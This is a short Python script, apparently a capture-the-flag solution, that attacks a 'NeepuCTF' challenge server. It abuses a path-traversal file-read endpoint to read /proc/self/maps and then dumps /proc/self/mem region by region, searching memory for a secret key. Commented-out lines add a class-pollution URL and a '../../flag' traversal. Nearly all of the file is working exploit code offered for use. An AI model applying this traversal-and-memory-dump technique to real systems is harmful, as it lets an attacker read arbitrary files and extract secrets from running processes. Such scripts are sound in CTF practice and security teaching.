import base64
import os
import  re
import requests
# print(str(base64.b64encode(os.urandom(30)).decode()) + "*NeepuCTF*")
# pollution_url="http://localhost:8848/?name=os.path.pardir&m1sery=boogipop"
# flagurl="http://localhost:8848/../../flag"
url="http://neepusec.fun:28388/r3aDF1le"
maps_url = f"{url}?filename=../../../proc/self/maps"
maps_reg = "([a-z0-9]{12}-[a-z0-9]{12}) rw.*?00000000 00:00 0"
maps = re.findall(maps_reg, requests.get(maps_url).text)
print(maps)
cookie=''
for m in maps:
    print(m)
    start, end = m.split("-")[0], m.split("-")[1]
    Offset, Length = str(int(start, 16)), str(int(end, 16))
    read_url = f"{url}?filename=../../../proc/self/mem&start={Offset}&end={Length}"
    print(read_url)
    s = requests.get(read_url).content
    # print(s)
    rt = re.findall(b"(.{40})\*NeepuCTF\*", s)
    if rt:
        print(rt[0])